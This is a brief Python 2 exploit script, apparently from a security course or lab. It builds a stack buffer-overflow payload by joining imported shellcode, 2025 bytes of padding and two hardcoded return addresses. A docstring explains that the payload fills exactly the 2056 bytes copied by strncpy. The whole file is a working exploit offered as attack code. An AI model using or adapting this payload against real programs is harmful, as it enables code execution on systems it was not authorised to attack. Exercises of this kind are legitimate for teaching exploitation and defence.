'''
we are giving the target the shellcode, padding, address of edx, and address eax
the total number of bytes = 2056 which is exactly how many are assigned in strncpy
'''
from shellcode import shellcode
from struct import pack

print shellcode + "a"*2025 + pack("<I", 0xbffedcf8) + pack("<I", 0xbffee50c)

